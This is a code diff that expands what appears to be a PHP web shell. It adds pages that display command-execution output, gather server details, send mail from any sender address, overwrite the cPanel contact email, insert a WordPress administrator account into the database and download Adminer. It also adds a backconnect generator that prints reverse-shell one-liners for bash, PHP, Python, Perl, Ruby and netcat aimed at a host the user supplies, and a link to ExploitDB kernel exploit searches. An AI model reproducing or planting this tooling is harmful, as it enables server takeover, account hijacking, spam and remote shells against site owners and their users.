             <?php if (isset($_POST['cmd'])): ?>
-                <div style="background: rgba(0, 0, 0, 0.5); padding: 15px; border: 1px solid #00ff88; border-radius: 5px; font-size: 12px; color: #00ff88; overflow-x: auto; max-height: 400px; overflow-y: auto;">
+                <div class="terminal-output">
                     <pre><?php echo htmlspecialchars(execute_cmd($_POST['cmd'])); ?></pre>
                 </div>
             <?php endif; ?>
 
-        <?php elseif ($_GET['page'] === 'info'): ?>
+        <!-- SYSTEM INFO -->
+        <?php elseif ($_GET['page'] === 'system'): ?>
             <h2 style="color: #00ff88; margin-bottom: 20px;">ℹ️ System Information</h2>
             <table>
                 <tr>
                     <td><strong>OS:</strong></td>
                     <td><?php echo php_uname(); ?></td>
+                </tr>
+                <tr>
+                    <td><strong>Kernel:</strong></td>
+                    <td><?php echo get_kernel_version(); ?></td>
+                </tr>
+                <tr>
+                    <td><strong>Distro:</strong></td>
+                    <td><?php echo get_linux_distro(); ?></td>
                 </tr>
                 <tr>
                     <td><strong>PHP Version:</strong></td>
@@ -600,80 +820,313 @@ sort($files);
                     <td><?php echo gethostname(); ?></td>
                 </tr>
                 <tr>
-                    <td><strong>IP Address:</strong></td>
+                    <td><strong>Server IP:</strong></td>
                     <td><?php echo $_SERVER['SERVER_ADDR'] ?? 'Unknown'; ?></td>
                 </tr>
                 <tr>
+                    <td><strong>Document Root:</strong></td>
+                    <td><?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'; ?></td>
+                </tr>
+                <tr>
                     <td><strong>Disk Free:</strong></td>
-                    <td><?php echo get_file_size(disk_free_space('/')); ?></td>
+                    <td><?php echo format_size(disk_free_space('/')); ?></td>
                 </tr>
                 <tr>
                     <td><strong>Current Dir:</strong></td>
-                    <td><?php echo getcwd(); ?></td>
+                    <td><?php echo $current_dir; ?></td>
                 </tr>
             </table>
 
-        <?php elseif ($_GET['page'] === 'tools'): ?>
-            <h2 style="color: #00ff88; margin-bottom: 20px;">🛠️ Tools</h2>
-            <div class="toolbar">
-                <button class="btn" onclick="showModal('hash')">🔒 Hash Generator</button>
-                <button class="btn" onclick="showModal('base64')">📝 Base64 Encode/Decode</button>
+        <!-- PHP MAILER -->
+        <?php elseif ($_GET['page'] === 'mailer'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">📧 PHP Mailer</h2>
+            <form method="POST" style="max-width: 600px;">
+                <div class="modal-body">
+                    <input type="email" name="mail_from" placeholder="From Email" required>
+                    <input type="email" name="mail_to" placeholder="To Email" required>
+                    <input type="text" name="mail_subject" placeholder="Subject" required>
+                    <textarea name="mail_message" placeholder="Message" style="height: 150px;"></textarea>
+                    <button type="submit" name="send_mail" class="btn">📤 Send Mail</button>
+                </div>
+            </form>
+            <?php
+            if (isset($_POST['send_mail'])) {
+                $headers = 'From: ' . $_POST['mail_from'];
+                if (mail($_POST['mail_to'], $_POST['mail_subject'], $_POST['mail_message'], $headers)) {
+                    echo '<div class="msg" style="margin-top: 15px;">✓ Email sent!</div>';
+                } else {
+                    echo '<div class="msg" style="margin-top: 15px; border-color: #ff4444; color: #ff4444;">✗ Failed to send!</div>';
+                }
+            }
+            ?>
+
+        <!-- HASH GENERATOR -->
+        <?php elseif ($_GET['page'] === 'hash'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">🔐 Hash Generator</h2>
+            <form method="POST" style="max-width: 600px;">
+                <textarea name="hash_input" placeholder="Enter text..." style="width: 100%; padding: 10px; background: #22242d; border: 1px solid #00ff88; color: #fff; border-radius: 4px; font-family: monospace; height: 100px; margin-bottom: 15px;"></textarea>
+                <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                    <button type="submit" name="hash_type" value="md5" class="btn">MD5</button>
+                    <button type="submit" name="hash_type" value="sha1" class="btn">SHA1</button>
+                    <button type="submit" name="hash_type" value="sha256" class="btn">SHA256</button>
+                </div>
+            </form>
+            <?php
+            if (isset($_POST['hash_type'])) {
+                $input = $_POST['hash_input'];
+                $type = $_POST['hash_type'];
+                $hash = hash($type, $input);
+                echo '<div class="terminal-output" style="margin-top: 15px;">
+                    <strong>' . strtoupper($type) . ':</strong><br>
+                    <pre>' . htmlspecialchars($hash) . '</pre>
+                </div>';
+            }
+            ?>
+
+        <!-- BASE64 -->
+        <?php elseif ($_GET['page'] === 'base64'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">📝 Base64 Encode/Decode</h2>
+            <form method="POST" style="max-width: 600px;">
+                <textarea name="b64_input" placeholder="Enter text..." style="width: 100%; padding: 10px; background: #22242d; border: 1px solid #00ff88; color: #fff; border-radius: 4px; font-family: monospace; height: 100px; margin-bottom: 15px;"></textarea>
+                <div style="display: flex; gap: 8px;">
+                    <button type="submit" name="b64_action" value="encode" class="btn">Encode</button>
+                    <button type="submit" name="b64_action" value="decode" class="btn">Decode</button>
+                </div>
+            </form>
+            <?php
+            if (isset($_POST['b64_action'])) {
+                try {
+                    $input = $_POST['b64_input'];
+                    $result = ($_POST['b64_action'] === 'encode') ? base64_encode($input) : base64_decode($input, true);
+                    echo '<div class="terminal-output" style="margin-top: 15px;">
+                        <strong>Result:</strong><br>
+                        <pre>' . htmlspecialchars($result) . '</pre>
+                    </div>';
+                } catch (Exception $e) {
+                    echo '<div class="msg" style="margin-top: 15px; border-color: #ff4444; color: #ff4444;">Error!</div>';
+                }
+            }
+            ?>
+
+        <!-- CPANEL -->
+        <?php elseif ($_GET['page'] === 'cpanel'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">🌐 CPanel Reset</h2>
+            <form method="POST" style="max-width: 600px;">
+                <div class="modal-body">
+                    <input type="email" name="cp_email" placeholder="Your Email" required>
+                    <button type="submit" name="reset_cp" class="btn">Reset</button>
+                </div>
+            </form>
+            <?php
+            if (isset($_POST['reset_cp'])) {
+                $email = $_POST['cp_email'];
+                $cp_path = dirname($_SERVER['DOCUMENT_ROOT']) . '/.cpanel/contactinfo';
+                if (@is_dir(dirname($_SERVER['DOCUMENT_ROOT']) . '/.cpanel')) {
+                    $content = '{"email": "' . $email . '"}';
+                    if (file_put_contents($cp_path, $content)) {
+                        echo '<div class="msg" style="margin-top: 15px;">✓ Success!</div>';
+                    }
+                }
+            }
+            ?>
+
+        <!-- WORDPRESS -->
+        <?php elseif ($_GET['page'] === 'wp'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">📰 Create WordPress User</h2>
+            <form method="POST" style="max-width: 600px;">
+                <div class="modal-body">
+                    <input type="text" name="wp_db" placeholder="Database Name" required>
+                    <input type="text" name="wp_user_db" placeholder="Database User" required>
+                    <input type="password" name="wp_pass_db" placeholder="Database Password" required>
+                    <input type="text" name="wp_host" placeholder="Database Host" value="localhost" required>
+                    <hr style="border: none; border-top: 1px solid #00ff88; margin: 15px 0;">
+                    <input type="text" name="wp_username" placeholder="WordPress Username" required>
+                    <input type="password" name="wp_password" placeholder="WordPress Password" required>
+                    <input type="email" name="wp_email" placeholder="WordPress Email" required>
+                    <button type="submit" name="create_wp" class="btn">Create User</button>
+                </div>
+            </form>
+            <?php
+            if (isset($_POST['create_wp'])) {
+                try {
+                    $conn = new mysqli($_POST['wp_host'], $_POST['wp_user_db'], $_POST['wp_pass_db'], $_POST['wp_db']);
+                    if (!$conn->connect_error) {
+                        $hash = password_hash($_POST['wp_password'], PASSWORD_DEFAULT);
+                        $sql = "INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status) VALUES (?, ?, ?, NOW(), 0)";
+                        $stmt = $conn->prepare($sql);
+                        $stmt->bind_param("sss", $_POST['wp_username'], $hash, $_POST['wp_email']);
+                        if ($stmt->execute()) {
+                            $user_id = $conn->insert_id;
+                            $sql2 = "INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (?, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')" ;
+                            $stmt2 = $conn->prepare($sql2);
+                            $stmt2->bind_param("i", $user_id);
+                            if ($stmt2->execute()) {
+                                echo '<div class="msg" style="margin-top: 15px;">✓ User created successfully!</div>';
+                            }
+                        }
+                        $conn->close();
+                    }
+                } catch (Exception $e) {
+                    echo '<div class="msg" style="margin-top: 15px; border-color: #ff4444; color: #ff4444;">✗ Error!</div>';
+                }
+            }
+            ?>
+
+        <!-- ADMINER -->
+        <?php elseif ($_GET['page'] === 'adminer'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">🗄️ Adminer</h2>
+            <p>Mengunduh Adminer...</p>
+            <?php
+            $adminer_url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
+            $adminer_path = $current_dir . '/adminer.php';
+            
+            if (!file_exists($adminer_path)) {
+                $content = @file_get_contents($adminer_url);
+                if ($content) {
+                    file_put_contents($adminer_path, $content);
+                    echo '<div class="msg">✓ Adminer downloaded! <a href="?dir=' . base64_encode($current_dir) . '">Back</a></div>';
+                } else {
+                    echo '<div class="msg" style="border-color: #ff4444; color: #ff4444;">✗ Failed to download</div>';
+                }
+            } else {
+                echo '<div class="msg">✓ Adminer already exists!</div>';
+            }
+            ?>
+
+        <!-- BACKCONNECT -->
+        <?php elseif ($_GET['page'] === 'backconnect'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">🔌 Backconnect</h2>
+            <form method="POST" style="max-width: 600px;">
+                <div class="modal-body">
+                    <select name="bc_type" style="width: 100%; padding: 8px; background: #22242d; border: 1px solid #00ff88; color: #fff; border-radius: 4px; margin-bottom: 10px; font-family: monospace;">
+                        <option value="">- Choose Type -</option>
+                        <option value="bash">Bash</option>
+                        <option value="php">PHP</option>
+                        <option value="python">Python</option>
+                        <option value="perl">Perl</option>
+                        <option value="ruby">Ruby</option>
+                        <option value="nc">Netcat</option>
+                    </select>
+                    <input type="text" name="bc_host" placeholder="Target Host" required>
+                    <input type="number" name="bc_port" placeholder="Target Port" required>
+                    <button type="submit" name="gen_bc" class="btn">Generate</button>
+                </div>
+            </form>
+            <?php
+            if (isset($_POST['gen_bc'])) {
+                $host = $_POST['bc_host'];
+                $port = $_POST['bc_port'];
+                $type = $_POST['bc_type'];
+                
+                $commands = [
+                    'bash' => "bash -i >& /dev/tcp/$host/$port 0>&1",
+                    'php' => "\$sock=fsockopen('$host',$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");",
+                    'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                    'perl' => "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($port,inet_aton(\"$host\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
+                    'ruby' => "ruby -rsocket -e 'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+                    'nc' => "nc -e /bin/sh $host $port"
+                ];
+                
+                if (isset($commands[$type])) {
+                    echo '<div class="terminal-output" style="margin-top: 15px;">
+                        <pre>' . htmlspecialchars($commands[$type]) . '</pre>
+                    </div>';
+                }
+            }
+            ?>
+
+        <!-- LINUX EXPLOIT -->
+        <?php elseif ($_GET['page'] === 'exploit'): ?>
+            <h2 style="color: #00ff88; margin-bottom: 20px;">💊 Linux Exploit Finder</h2>
+            <div class="terminal-output">
+                <strong>Kernel Version:</strong> <?php echo get_kernel_version(); ?><br><br>
+                <strong>Search on ExploitDB:</strong><br>
+                <a href="https://www.exploit-db.com/search?q=<?php echo urlencode(get_kernel_version()); ?>" target="_blank" style="color: #00ff88;">
+                    🔗 Click here to search for exploits
+                </a>
             </div>
 
         <?php endif; ?>
     </div>
 </div>
 
-<!-- Modal: Create Folder -->
-<div id="folder_modal" class="modal">
-    <div class="modal-content">
-        <h3>📁 Create New Folder</h3>
-        <form method="POST">
+<!-- MODALS -->
+<!-- Mkdir Modal -->
+<div class="modal" id="mkdir_modal">
+    <div class="modal-container">
+        <div class="modal-header">📁 Create New Folder</div>
+        <form method="POST" class="modal-body">
             <input type="text" name="folder_name" placeholder="Folder name" required>
             <div class="modal-buttons">
-                <button type="submit" name="create_folder">Create</button>
-                <button type="button" onclick="closeModal('folder')">Cancel</button>
+                <button type="submit" name="mkdir">Create</button>
+                <button type="button" onclick="closeModal('mkdir_modal')">Cancel</button>
             </div>
         </form>
     </div>
 </div>
 
-<!-- Modal: Hash Generator -->
-<div id="hash_modal" class="modal">
-    <div class="modal-content">
-        <h3>🔒 Hash Generator</h3>
-        <textarea id="hash_input" placeholder="Enter text..." style="height: 100px;"></textarea>
-        <div id="hash_output"></div>
-        <div class="modal-buttons">
-            <button onclick="generateHash('md5')">MD5</button>
-            <button onclick="generateHash('sha1')">SHA1</button>
-            <button onclick="generateHash('sha256')">SHA256</button>
-            <button type="button" onclick="closeModal('hash')">Close</button>
-        </div>
+<!-- Mkfile Modal -->
+<div class="modal" id="mkfile_modal">
+    <div class="modal-container">
+        <div class="modal-header">📄 Create New File</div>
+        <form method="POST" class="modal-body">
+            <input type="text" name="file_name" placeholder="File name" required>
+            <div class="modal-buttons">
+                <button type="submit" name="mkfile">Create</button>
+                <button type="button" onclick="closeModal('mkfile_modal')">Cancel</button>
+            </div>
+        </form>
     </div>
 </div>
 
-<!-- Modal: Base64 -->
-<div id="base64_modal" class="modal">
-    <div class="modal-content">
-        <h3>📝 Base64 Encode/Decode</h3>
-        <textarea id="base64_input" placeholder="Enter text..." style="height: 100px;"></textarea>
-        <div id="base64_output"></div>
-        <div class="modal-buttons">
-            <button onclick="encodeBase64()">Encode</button>
-            <button onclick="decodeBase64()">Decode</button>
-            <button type="button" onclick="closeModal('base64')">Close</button>
-        </div>
+<!-- Rename Modal -->
+<div class="modal" id="rename_modal">
+    <div class="modal-container">
+        <div class="modal-header">↻ Rename File</div>
+        <form method="POST" class="modal-body">
+            <input type="hidden" name="old_name" id="rename_old">
+            <input type="text" name="new_name" id="rename_new" placeholder="New name" required>
+            <div class="modal-buttons">
+                <button type="submit" name="rename_submit">Rename</button>
+                <button type="button" onclick="closeModal('rename_modal')">Cancel</button>
+            </div>
+        </form>
+    </div>
+</div>
+
+<!-- Chmod Modal -->
+<div class="modal" id="chmod_modal">
+    <div class="modal-container">
+        <div class="modal-header">🔒 Change Permissions</div>
+        <form method="POST" class="modal-body">
+            <input type="hidden" name="chmod_file" id="chmod_file">
+            <input type="text" name="chmod_value" placeholder="e.g., 0755" required>
+            <div class="modal-buttons">
+                <button type="submit" name="chmod_submit">Change</button>
+                <button type="button" onclick="closeModal('chmod_modal')">Cancel</button>
+            </div>
+        </form>
     </div>
 </div>
 
 <script>
-function showModal(name) {
-    document.getElementById(name + '_modal').style.display = 'block';
+function openModal(modal) {
+    document.getElementById(modal + '_modal').style.display = 'block';
 }
 
-function closeModal(name) {
-    document.getElementById(name + '_modal').style.display = 'none';
+function closeModal(modal) {
+    document.getElementById(modal).style.display = 'none';
+}
+
+function openRename(filename) {
+    document.getElementById('rename_old').value = JSON.parse(filename);
+    document.getElementById('rename_new').value = JSON.parse(filename);
+    openModal('rename');
+}
+
+function openChmod(filename) {
+    document.getElementById('chmod_file').value = JSON.parse(filename);
+    openModal('chmod');
 }
 
 window.onclick = function(e) {
@@ -682,32 +1135,12 @@ window.onclick = function(e) {
     }
 }
 
-document.getElementById('file_input').addEventListener('change', function() {
-    document.getElementById('real_file_input').files = this.files;
-    document.getElementById('upload_form').submit();
-});
-
-function generateHash(type) {
-    // Note: This is client-side demonstration. For real usage, you need server-side processing
-    let text = document.getElementById('hash_input').value;
-    alert('Hash type: ' + type + '\n(Server-side implementation required)');
-}
-
-function encodeBase64() {
-    let text = document.getElementById('base64_input').value;
-    let encoded = btoa(text);
-    document.getElementById('base64_output').innerHTML = '<strong>Encoded:</strong><br><input type="text" value="' + encoded + '" style="width:100%; margin-top: 10px; padding: 8px;" readonly>';
-}
-
-function decodeBase64() {
-    try {
-        let text = document.getElementById('base64_input').value;
-        let decoded = atob(text);
-        document.getElementById('base64_output').innerHTML = '<strong>Decoded:</strong><br><input type="text" value="' + decoded + '" style="width:100%; margin-top: 10px; padding: 8px;" readonly>';
-    } catch(e) {
-        document.getElementById('base64_output').innerHTML = '<span style="color: #ff4444;">Invalid Base64!</span>';
+document.getElementById('file_input')?.addEventListener('change', function() {
+    if (document.getElementById('real_file_input')) {
+        document.getElementById('real_file_input').files = this.files;
+        document.getElementById('upload_form').submit();
     }
-}
+});
 </script>
 </body>
 </html>
